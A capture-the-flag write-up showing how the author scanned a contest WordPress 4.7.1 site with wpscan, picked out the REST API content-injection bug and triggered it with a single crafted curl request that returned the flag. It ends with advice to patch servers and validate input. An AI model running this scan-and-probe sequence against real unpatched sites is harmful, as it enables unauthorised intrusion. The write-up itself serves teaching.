# PHP Fly Casting

## Brief

```
Goal: Exploit Wordpress.

https://api.voldemortensen.com/
```

# Reconnaissance

Wordpress! Hooray! Wordpress has a reputation for being exploitable - while the Wordpress developers do patch vulnerabilities
as they find them, there are many, many unpatched Wordpress installations out there. There's a reason why the Script Kiddies 
are constantly scanning your non-Wordpress servers for `/wp-admin/`!

So, let's start by finding out more about this Wordpress install. The easiest way is with [`wpscan`](https://wpscan.org/). WPScan
will tell us about the version of Wordpress that is installed, any common plugins, themes, etc., and any known vulnerabilities in
the installed version. It can also try to brute-force the login, but we already know from the contest rules that brute-forcing
is not necessary.

```
wpscan -u https://api.voldemortensen.com
```

```
_______________________________________________________________
        __          _______   _____
        \ \        / /  __ \ / ____|
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
                       Version 2.9.4
          Sponsored by Sucuri - https://sucuri.net
      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
_______________________________________________________________

[+] URL: https://api.voldemortensen.com/
[+] Started: Fri Sep 28 11:22:36 2018

[+] Interesting header: LINK: <https://api.voldemortensen.com/wp-json/>; rel="https://api.w.org/"
[+] Interesting header: SERVER: Apache/2.4.34 () OpenSSL/1.0.2k-fips
[+] Interesting header: X-POWERED-BY: PHP/7.2.8
[+] robots.txt available under: https://api.voldemortensen.com/robots.txt   [HTTP 200]
[+] XML-RPC Interface available under: https://api.voldemortensen.com/xmlrpc.php   [HTTP 405]
[+] API exposed: https://api.voldemortensen.com/wp-json/   [HTTP 200]
[!] 1 user exposed via API: https://api.voldemortensen.com/wp-json/wp/v2/users
+----+-------+----------------------------------------------+
| ID | Name  | URL                                          |
+----+-------+----------------------------------------------+
| 1  | admin | https://api.voldemortensen.com/author/admin/ |
+----+-------+----------------------------------------------+
[+] Found an RSS Feed: https://api.voldemortensen.com/feed/   [HTTP 200]
[!] Detected 1 user from RSS feed:
+-------+
| Name  |
+-------+
| admin |
+-------+

[+] Enumerating WordPress version ...

[+] WordPress version 4.7.1 (Released on 2017-01-11) identified from meta generator, links opml
[!] 35 vulnerabilities identified from the version number

... Then there's a long list of vulnerabilities ...

[+] WordPress theme in use: twentyseventeen - v1.7

[+] Name: twentyseventeen - v1.7
 |  Latest version: 1.7 (up to date)
 |  Last updated: 2018-08-02T00:00:00.000Z
 |  Location: https://api.voldemortensen.com/wp-content/themes/twentyseventeen/
 |  Readme: https://api.voldemortensen.com/wp-content/themes/twentyseventeen/README.txt
 |  Style URL: https://api.voldemortensen.com/wp-content/themes/twentyseventeen/style.css
 |  Theme Name: Twenty Seventeen
 |  Theme URI: https://wordpress.org/themes/twentyseventeen/
 |  Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a...
 |  Author: the WordPress team
 |  Author URI: https://wordpress.org/

[+] Enumerating plugins from passive detection ...
[+] No plugins found passively

[+] Finished: Fri Sep 28 11:22:49 2018
[+] Elapsed time: 00:00:12
[+] Requests made: 87
[+] Memory used: 45.074 MB
```

So, they're running Wordpress 4.7.1, they've got the xmlrpc and wp-json APIs enabled, and there is one user, named `admin`.

So, there are a lot of vulnerabilities here. We can research them, starting with those that look the most interesting.

One that stands out is this one:

```
[!] Title: WordPress 4.7.0-4.7.1 - Unauthenticated Page/Post Content Modification via REST API
    Reference: https://wpvulndb.com/vulnerabilities/8734
    Reference: https://blog.sucuri.net/2017/02/content-injection-vulnerability-wordpress-rest-api.html
    Reference: https://blogs.akamai.com/2017/02/wordpress-web-api-vulnerability.html
    Reference: https://gist.github.com/leonjza/2244eb15510a0687ed93160c623762ab
    Reference: https://github.com/WordPress/WordPress/commit/e357195ce303017d517aff944644a7a1232926f7
    Reference: https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_content_injection
[i] Fixed in: 4.7.2
```

If you read the [Sucuri](https://blog.sucuri.net/2017/02/content-injection-vulnerability-wordpress-rest-api.html) article,
you find out that this vulnerability is partially due to some unvalidated type casting that is happening in the PHP code - hey,
that's like the name of the challenge!  We must be on the right track!

So, let's see if this site is vulnerable:

```
curl 'https://api.voldemortensen.com/wp-json/wp/v2/posts/1?id=2'

{"code":"rest_post_invalid_id","message":"FLAG{DYNAMIC_TYPING_CAN_RUIN_YOUR_DAY}","data":{"status":404}}
```

Hooray!  A flag!

# Takeaways

1. Patch your servers! Unpatched servers are a script kiddie's playground.
2. Validate your inputs!

